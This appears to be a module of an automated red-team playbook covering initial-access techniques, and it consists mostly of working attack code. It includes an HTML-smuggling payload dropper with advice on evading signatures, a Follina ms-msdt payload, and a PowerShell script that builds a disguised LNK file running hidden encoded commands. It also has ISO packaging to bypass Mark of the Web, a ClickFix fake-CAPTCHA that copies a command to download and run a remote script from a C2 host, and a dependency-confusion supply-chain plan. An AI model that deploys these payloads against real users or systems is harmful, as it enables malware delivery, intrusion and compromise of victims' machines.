# RT01: Initial Access

**MITRE:** T1027.006, T1221, T1204.002, T1189 | **When:** No auth bypass confirmed from exploit phase.

## HTML Smuggling (T1027.006) - Bypasses email gateways

```html
<!-- Payload assembled via JS Blob in browser - never touches disk as file attachment -->
<script>
  const b64 = "TVqQAAMA..."; // base64-encoded payload
  const bytes = atob(b64).split('').map(c => c.charCodeAt(0));
  const blob = new Blob([new Uint8Array(bytes)], {type: 'application/octet-stream'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'Invoice_Q4.iso';
  document.body.appendChild(a);
  a.click();
</script>
```

Note: `document.createElement('a')` + `click()` is signatured. Alternative: `navigator.msSaveOrOpenBlob` or split b64 across variables concatenated at runtime.

## Macro-less Office Delivery

**Remote Template Injection (T1221):**
```
Word doc -> File -> Templates -> set template URL to attacker C2
On open: doc fetches remote .dotm which contains macros
No VBA in delivered .docx - bypasses macro-disabled policies
```

**XLL Add-in (T1137.006):**
```
Excel Add-in (.xll) - executes DllMain on open
Lower detection than VBA in 2023-2025 campaigns
Entry point: xlAutoOpen exported function
```

**MSDT / Follina-style (CVE-2022-30190):**
```
ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile=?/../../../../../../Windows/System32/cmd.exe /c calc"
Embedded in Word doc as OLE object - executes on Preview
Check patch status: KB5014699
```

## LNK / ISO / IMG Delivery (T1204.002)

Primary post-2022 vector (Microsoft blocked macros by default). Emotet/BazarLoader/Bumblebee chains.

```powershell
# LNK with hidden cmd execution:
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("Invoice.lnk")
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = "/c powershell -nop -w hidden -enc <BASE64_PAYLOAD>"
$lnk.IconLocation = "%SystemRoot%\system32\shell32.dll,70"  # PDF icon
$lnk.WindowStyle = 7  # minimized
$lnk.Save()
```

```bash
# ISO container bypasses MotW (Zone.Identifier ADS not propagated into mounted ISO)
mkisofs -o delivery.iso -V "Invoice" ./payload_dir/
# payload_dir/: Invoice.lnk, Invoice_decoy.pdf, resources/ (hidden DLL)
```

## Drive-by Compromise (T1189) + Fake CAPTCHA (ClickFix 2024)

```javascript
// Fingerprint before delivering payload:
var ua = navigator.userAgent;
if (ua.indexOf("Windows NT") > -1 && screen.width >= 1920) {
  // serve exploit redirect to corporate targets only
}
```

```html
<!-- Fake CAPTCHA - used by ClearFake/ClickFix campaigns ITW 2024 -->
<button onclick="navigator.clipboard.writeText('powershell -w hidden -c IEX (iwr https://c2.domain/stage1.ps1)')">
  Verify you are human
</button>
<!-- Then display: "Press Win+R, Ctrl+V, Enter" instruction -->
```

## Spearphishing with Supply Chain Hook

```
Compromise developer tool/build pipeline
Inject malicious npm/pypi package (dependency confusion)
Target employees pull infected dep on next npm install
Payload executes in developer environment - often AV-exempt
```

**Signal:** `emit_signal SURFACE_FOUND "Initial access via <method>" "main/redteam" 0.85`
